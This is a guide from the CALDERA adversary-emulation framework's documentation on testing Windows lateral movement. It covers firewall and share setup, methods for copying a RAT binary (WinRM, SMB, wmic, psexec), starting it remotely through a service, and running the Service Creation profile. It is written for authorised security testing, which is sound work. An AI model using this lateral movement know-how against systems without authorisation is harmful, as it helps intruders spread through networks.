# Windows Lateral Movement Guide

Exercising Caldera's lateral movement and remote execution abilities allows you to test how easily an adversary can move
within your network. This guide will walk you through some of the necessary setup steps to get started with testing 
lateral movement in a Windows environment.

## Setup

### Firewall Exceptions and Enabling File and Printer Sharing

The firewall of the target host should not be blocking UDP ports 137 and 138 and TCP ports 139 and 445. The firewall
should also allow inbound file and printer sharing.

```
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
```

### User with Administrative Privileges

This guide will assume a user *with administrative privileges to the target host* has been compromised and that a CALDERA
agent has been spawned with this user's privileges. Some methods of lateral movement may depend on whether (1) the user 
has administrative privileges but is not a domain account or (2) the user has administrative privileges and is a domain 
account. The example walkthrough in this guide should not be impacted by these distinctions.

### Additional Considerations

1. Ensure GPO/SRP or antivirus is not blocking remote access to shares.
2. Ensure at least ADMIN$, C$, and IPC$ shares exist on the target host.

## Lateral Movement Using CALDERA
Lateral movement can be a combination of two steps. The first requires confirmation of remote access to the next target 
host and the movement or upload of the remote access tool (RAT) executable to the host. The second part requires 
*execution* of the binary, which upon callback of the RAT on the new host would complete the lateral movement.

Most of CALDERA's lateral movement and execution abilities found in Stockpile have fact or relationship requirements 
that must be satisfied. This information may be passed to the operation in two ways:
1. The fact and relationship information may be added to an operation's source. A new source can be created or this
information can be added to an already existing source as long as that source is used by the operation. When configuring
an operation, open the "**AUTONOMOUS**" drop down section and select "Use [insert source name] facts" to indicate to the 
operation that it should take in fact and relationship information from the selected source.
2. The fact and relationship information can be discovered by an operation. This requires additional abilities to be run
prior to the lateral movement and execution abilities to collect the necessary fact and relationship information 
necessary to satisfy the ability requirements.

### Moving the Binary
There are several ways a binary can be moved or uploaded from one host to another. Some example methods used in 
CALDERA's lateral movement abilities include:
1. WinRM
2. SCP
3. wmic
4. SMB
5. psexec
 
Based on the tool used, additional permissions may need to be changed in order for users to conduct these actions 
remotely.

### Execution of the Binary
CALDERA's Stockpile execution abilities relevant to lateral movement mainly use wmic to remotely start the binary. Some 
additional execution methods include modifications to Windows services and scheduled tasks. The example in this guide 
will use the creation of a service to remotely start the binary (ability file included at the end of this guide).

See ATT&CK's [Execution](https://attack.mitre.org/tactics/TA0002/) tactic page for more details on execution methods.

### Displaying Lateral Movement in Debrief
Using the adversary profile in this guide and CALDERA's Debrief plugin, you can view the path an adversary took through 
the network via lateral movement attempts. In the Debrief modal, select the operation where lateral movement was 
attempted then select the Attack Path view from the upper right hand corner of graph views. This graph displays the 
originating C2 server and agent nodes connected by the execution command linking the originating agent to the newly
spawned agent.

In the example attack path graph below, the Service Creation Lateral Movement adversary profile was run on the `win10` 
host, which moved laterally to the `VAGRANTDC` machine via successful execution of the Service Creation ability.

This capability relies on the `origin_link_id` field to be populated within the agent profile upon first
check-in and is currently implemented for the default agent, Sandcat. For more information about the `#{origin_link_id}`
global variable, see the explanation of **Command** in the [Abilities](Basic-Usage.md#abilities)
section of the Basic Usage guide. For more information about how lateral movement tracking is implemented 
in agents to be used with CALDERA, see the [Lateral Movement Tracking](How-to-Build-Agents.md#lateral-movement-tracking) 
section of the How to Build Agents guide.


## Example Lateral Movement Profile
This section will walkthrough the necessary steps for proper execution of the Service Creation Lateral Movement
adversary profile. This section will assume successful setup from the previous sections mentioned in this guide and that
a Sandcat agent has been spawned with administrative privileges to the remote target host. The full ability files used 
in this adversary profile are included at the end of this guide.

1. Go to `navigate` pane > `Advanced` > `sources`. This should open a new sources modal in the web GUI.
2. Click the toggle to create a new source. Enter "SC Source" as the source name. Then enter `remote.host.fqdn` as the 
fact name and the FQDN of the target host you are looking to move laterally to as the fact value. Click `Save` once 
source configuration has been completed.
3. Go to `navigate` pane > `Campaigns` > `operations`. Click the toggle to create a new operation. Under 
`BASIC OPTIONS` select the group with the relevant agent and the Service Creation Lateral Movement profile. Under 
`AUTONOMOUS`, select `Use SC Source facts`. If the source created from the previous step is not available in the 
drop down, try refreshing the page. 
4. Once operation configurations have been completed, click `Start` to start the operation.
5. Check the agents list for a new agent on the target host.
